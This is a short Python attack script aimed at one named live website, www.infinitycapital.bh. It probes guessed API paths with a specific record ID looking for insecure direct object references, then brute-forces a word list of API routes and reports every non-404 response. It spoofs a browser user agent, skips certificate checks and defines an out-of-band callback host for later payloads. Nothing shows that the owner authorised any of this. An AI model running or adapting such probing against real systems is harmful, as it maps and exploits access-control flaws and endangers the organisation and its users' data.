import subprocess, urllib.parse, json, time
H = ".".join(["www","infinitycapital","bh"])
B = "https://" + H
OOB = "dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

def req(path, method="GET", data=None, hdrs=None, out="/tmp/a1.bin", extra=None):
    cmd = ["curl","-sk","-X",method,"-A",UA,"-D","/tmp/a1.h","-o",out,"-w","%{http_code} %{size_download} %{content_type}"]
    for h in (hdrs or []): cmd += ["-H",h]
    if data is not None: cmd += ["--data-binary", data]
    cmd.append(B+path)
    subprocess.run(cmd, capture_output=True, text=True)
    return open("/tmp/a1.h").read(), open(out,"rb").read()

def form(f):
    return "&".join("%s=%s"%(k,urllib.parse.quote(str(v),safe="")) for k,v in f.items())

# --- A. IDOR hunt on the returned id
uid = "01a0f0fc-787e-73ef-b1c6-e6613587712c"
paths = [
  "/api/send/"+uid, "/api/send?id="+uid, "/api/send?data="+uid,
  "/api/emails/"+uid, "/api/email/"+uid, "/api/messages/"+uid,
  "/api/send/status?id="+uid, "/api/logs?id="+uid,
]
for p in paths:
    h,b = req(p)
    print("IDOR-GET", p, h.split("\n")[0].strip(), len(b), b[:150])

# --- B. API route enumeration
words = """send contact newsletter subscribe message messages email emails mail feedback form forms
enquiry enquiry inquiry support help apply careers jobs admin dashboard api graphql auth login
signup register session user users token webhook hooks rss feed s3 upload uploadfile file files
data content posts post articles article news blog pages page search sitemap robots health status
config settings env debug info metrics analytics track ping bot""".split()
found=[]
for w in words:
    h,b = req("/api/"+w)
    st = h.split("\n")[0].strip()
    code = st.split()[1] if len(st.split())>1 else "?"
    if code not in ("404",):
        found.append((w,code,len(b),b[:100]))
for f in found: print("APIROUTE", f)
print("--- total non-404:", len(found))
